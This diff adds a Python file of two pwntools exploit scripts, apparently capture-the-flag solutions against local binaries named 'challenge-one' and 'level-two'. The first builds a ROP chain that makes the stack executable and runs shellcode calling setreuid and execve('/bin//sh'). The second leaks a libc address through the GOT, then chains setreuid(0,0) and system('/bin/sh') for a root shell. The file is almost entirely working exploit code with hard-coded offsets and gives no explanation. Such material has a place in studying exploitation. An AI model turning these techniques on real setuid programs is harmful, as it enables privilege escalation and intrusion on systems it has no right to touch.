@@ -1,0 +1,76 @@
+#Challenge-one
+
+"""0x0806b893 : pop eax ; ret
+0x080525ed : pop ecx ; pop ebx ; ret
+0x080525c6 : pop edx ; ret
+0x08079191 : mov dword ptr [edx], eax ; ret
+0x080487bd : int 0x80
+0x80799f0 <_dl_make_stack_executable>
+0x80ca620 <__stack_prot>
+0x080c4d43 : jmp esp
+"""
+from pwn import *
+popeax = 0x0806b893
+popecxebx = 0x080525ed
+popedx = 0x080525c6
+movdword = 0x08079191
+writeable = 0x80ca340
+int80 = 0x080487bd
+payload = "a"*0x2c
+payload += p32(popeax)
+payload += p32(7)
+payload += p32(popedx)
+payload += p32(0x80ca620) #__stack_prot
+payload += p32(movdword)
+payload += p32(popeax)
+payload += p32(0x80ca614)
+payload += p32(0x80799f0) #_dl_make_stack_executable
+payload += p32(0x080c4d43) #jmp rsp
+payload += 
+"\x6A\x46\x58\x31\xDB\x31\xC9\xCD\x80\x31\xD2\x6A\x0B\x58\x52\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x52\x53\x89\xE1\xCD\x80"
+# r = process("./challenge-one")
+# raw_input("?")
+# r.sendline(payload)
+# r.interactive()
+print payload
+
+# python filename.py > t.txt
+# cat t.txt | ./challenge-one
+
+
+# CHALLENGE TWO
+
+from pwn import *
+r = process("./level-two")
+payload = b"a"*0x8c
+payload += p32(0x080490c0) #write
+payload += p32(0x080491f6) #vuln_function
+payload += p32(1)
+payload += p32(0x804c00c) #read_GOT
+payload += p32(4)
+r.sendline(payload)
+readptr = u32(r.recv(4))
+base = readptr - 0xf45d0
+system = base + 0x45420
+sh = base + 0x18f352
+setreuid = base + 0xfea10
+log.info("read: %#x" %readptr)
+log.info("base: %#x" %base)
+log.info("system: %#x" %system)
+log.info("sh: %#x" %sh)
+log.info("setreuid: %#x" %setreuid)
+payload = b"a"*0x8c
+payload += p32(setreuid) 
+payload += p32(0x080491f6) #vuln_function
+payload += p32(0) 
+payload += p32(0)
+r.sendline(payload)
+payload = b"a"*0x8c
+payload += p32(system) 
+payload += p32(0)
+payload += p32(sh)
+payload += p32(0) 
+r.sendline(payload)
+r.interactive()
+
+# python two.py
